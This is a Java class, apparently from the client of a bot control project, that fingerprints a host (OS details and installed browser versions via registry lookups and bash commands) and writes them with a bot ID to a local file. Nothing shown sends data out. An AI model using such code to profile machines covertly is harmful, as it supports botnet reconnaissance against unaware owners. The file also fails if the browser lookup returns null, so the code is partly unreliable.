package control.client;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Date;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

import model.SystemInfoEntry;

/**
 * Classe contenente i metodi per raccogliere le informazioni relative al sistema
 */
public class SystemInfoBot {
	
	static Path filePath;	
	 ArrayList<SystemInfoEntry> systemInfoEntryList;

	public SystemInfoBot(Path filePath) {
		SystemInfoBot.filePath = filePath;
		systemInfoEntryList = new ArrayList<SystemInfoEntry>();
	}

	public ArrayList<SystemInfoEntry> getSystemInfoEntryList() {
		return systemInfoEntryList;
	}

	/**
	 * Scrittura sul file delle informazioni relative al sistema
	 */
	public void writeSystemInfoFile(String id) {
		ArrayList<String> browsers;
		Date date = new Date();
		systemInfoEntryList.add(new SystemInfoEntry("Id Bot", id));
		systemInfoEntryList.add(new SystemInfoEntry("OS Name", System.getProperty("os.name")));
		systemInfoEntryList.add(new SystemInfoEntry("OS Version", System.getProperty("os.version")));
		systemInfoEntryList.add(new SystemInfoEntry("OS Architecture", System.getProperty("os.arch")));
		
		browsers = getBrowsers();
		
		if(browsers!=null){
			for (int i = 0; i < browsers.size(); i++) {
				systemInfoEntryList.add(new SystemInfoEntry("Browser " + String.valueOf(i+1), browsers.get(i)));			
			}
		}else{
			systemInfoEntryList.add(new SystemInfoEntry("Browser", "not found"));			
		}
		systemInfoEntryList.add(new SystemInfoEntry("Date", date.toString()));
		
		Charset charset = Charset.forName("ISO-8859-1");
		try (BufferedWriter writer = Files.newBufferedWriter(filePath, charset, StandardOpenOption.WRITE)) {
				writer.write("Id Bot: " + id);
				writer.newLine();
				writer.write("OS Name: " + System.getProperty("os.name"));
				writer.newLine();
				writer.write("OS Version: " + System.getProperty("os.version"));
				writer.newLine();
				writer.write("OS Architecture: " + System.getProperty("os.arch"));
				writer.newLine();
				for (int i = 0; i < browsers.size(); i++) {
					writer.write("Browser " + String.valueOf(i+1) + ": " + browsers.get(i));
					writer.newLine();
				}
				writer.write("Date: " + date.toString());
				writer.newLine();
				
				writer.close();
		} catch (IOException x) {
		    System.err.format("IOException: %s%n", x);
		}
		
	}
	
	public void overwriteSystemInfoFile() {
		File sysInfoFile = new File(filePath.toString());
		try {
			sysInfoFile.delete();
			sysInfoFile.createNewFile();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
    /**
     *  Metodo per ottenere la lista dei browser installati nell'host
     */
    public static ArrayList<String> getBrowsers(){
    	ArrayList<String> browsers = new ArrayList<String>();
    	try {
            String os = System.getProperty("os.name").toLowerCase();
            if(os.contains("linux")){
                String temp;
                temp = unixTermOut("google-chrome --version");
                if (temp != null)
                    browsers.add(temp);
                temp = unixTermOut("firefox --version");
                if (temp != null)
                    browsers.add(temp);
                temp = unixTermOut("chromium-browser --version");
                if (temp != null)
                    browsers.add(temp);
            }
            else if(os.contains("windows")) {                
                // Internet Explorer
                String path = "SOFTWARE\\Microsoft\\Internet Explorer";
                String vField = System.getProperty("os.name").toLowerCase().equals("windows 8")? "svcVersion" : "Version";
                String version = Advapi32Util.registryGetStringValue(   
                    WinReg.HKEY_LOCAL_MACHINE, path, vField);
                browsers.add("Internet Explorer " + version);
                
                //Google Chrome
                String wowNode;
                if(System.getProperty("os.arch").contains("64")){
                	wowNode = "Wow6432Node\\";
                }else{
                	wowNode = "";            	
                }
                
                try{
                    path = "SOFTWARE\\" + wowNode + "Google\\Update\\Clients";
                    String key[] = Advapi32Util.registryGetKeys(
                        WinReg.HKEY_LOCAL_MACHINE, path);
                    for (String key1 : key) {
                        
                        try {
                            String name = Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, path + "\\" + key1, "name");
                            if(name.toLowerCase().equals("google chrome")){
                                version = Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, path + "\\" + key1, "pv");
                                browsers.add("Google Chrome " + version);
                            }
                        }catch (Exception e){}
                    }
                } catch(Exception e){}
                
                // Mozilla Firefox
                try{
                    version = Advapi32Util.registryGetStringValue( 
                        WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\" + wowNode + "Mozilla\\Mozilla Firefox", "CurrentVersion");
                    browsers.add("Mozilla Firefox " + version);

                } catch(Exception e){}
            }
            else {
                browsers.add("Unsupported OS");
            }			
		} catch (Exception e) {
			return null;
		}
        return browsers;
    }
 
    /**
     *  Metodo per eseguire la shell di comandi nei sistemi basati su unix
     */
    private static String unixTermOut(String cmd){
        String returnValue = "";
        String[] args = new String[] {"/bin/bash", "-c", cmd};
        try {
            Process process = new ProcessBuilder(args).start();
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            returnValue = br.readLine();
        } catch (IOException ex) {
        	ex.printStackTrace();
        }
        return returnValue;
    }
}
